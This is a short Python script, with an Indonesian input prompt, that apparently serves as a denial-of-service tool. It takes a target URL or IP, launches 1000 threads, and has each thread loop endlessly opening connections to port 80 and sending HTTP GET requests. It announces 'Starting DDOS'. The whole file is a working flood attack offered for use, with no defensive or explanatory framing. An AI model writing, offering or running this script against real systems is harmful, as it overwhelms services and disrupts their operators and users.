import socket
import threading
import sys

if len(sys.argv) < 2:
    target = input("Masukkan URL/IP target: ").strip()
else:
    target = sys.argv[1]

try:
    target_ip = socket.gethostbyname(target)
except:
    target_ip = target

target_port = 80
num_threads = 1000

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except:
            pass

print(f"Starting DDOS on {target} ({target_ip})...")
for i in range(num_threads):
    t = threading.Thread(target=ddos_attack)
    t.start()